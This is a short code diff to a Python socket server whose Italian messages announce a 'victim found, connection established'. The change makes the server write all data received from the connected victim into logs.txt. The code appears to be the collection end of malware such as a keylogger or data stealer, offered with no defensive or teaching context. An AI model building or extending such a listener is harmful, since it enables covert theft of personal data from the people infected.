@@ -16,11 +16,18 @@ class Server:
             server.listen()
             print("Server in ascolto")
             conn, add = server.accept()
+            file = open("logs.txt", "a")
+            i = True
             print(f"<-----------Vittima trovata, connessione stabilita! info: {add}----------->")
-            while True:
-                data = conn.recv(1024)
-                data = data.decode()
-                print(data)
+            with file:
+                while True:
+                    data = conn.recv(1024)
+                    data = data.decode()
+                    if i:
+                        file.write(f"{data}\n")
+                        i = False
+                    else:
+                        file.write(data)
 
 
 if __name__ == "__main__":
